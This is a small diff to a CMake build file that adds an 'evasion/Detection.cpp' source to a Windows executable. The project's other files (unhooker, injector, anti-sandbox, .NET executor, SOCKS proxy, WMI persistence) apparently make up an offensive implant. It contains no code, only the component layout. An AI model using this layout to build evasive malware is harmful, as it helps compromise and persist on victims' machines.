@@ -73,6 +73,7 @@ add_executable(main WIN32
     src/evasion/Unhooker.cpp
     src/evasion/Injector.cpp
     src/evasion/AntiSandbox.cpp
+    src/evasion/Detection.cpp
     src/execution/DotNetExecutor.cpp
     src/network/SocksProxy.cpp
     src/persistence/WmiPersistence.cpp
